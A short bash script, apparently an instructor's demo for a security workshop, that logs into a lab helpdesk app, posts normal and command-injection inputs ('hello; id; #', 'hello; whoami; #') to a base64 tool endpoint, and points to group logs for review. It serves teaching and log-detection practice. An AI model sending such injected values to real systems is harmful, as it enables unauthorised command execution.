#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
DEMO_USER_AGENT="${DEMO_USER_AGENT:-InstructorCmdiDemo/1.0}"
source "$SCRIPT_DIR/demo-common.sh"
trap cleanup_demo_cookie EXIT

require_curl
login_to_helpdesk

demo_get "normal-tools-page" "/tools"
demo_post_form "normal-base64" "/tools/base64" "text=hello workshop"
demo_post_form "cmdi-id" "/tools/base64" "text=hello; id; #"
demo_post_form "cmdi-whoami" "/tools/base64" "text=hello; whoami; #"

echo "Command injection demo complete. Review the matching group logs, for example workshop-logs/group1/web/access.log and workshop-logs/group1/web/app.log, for /tools/base64 entries from this source IP."
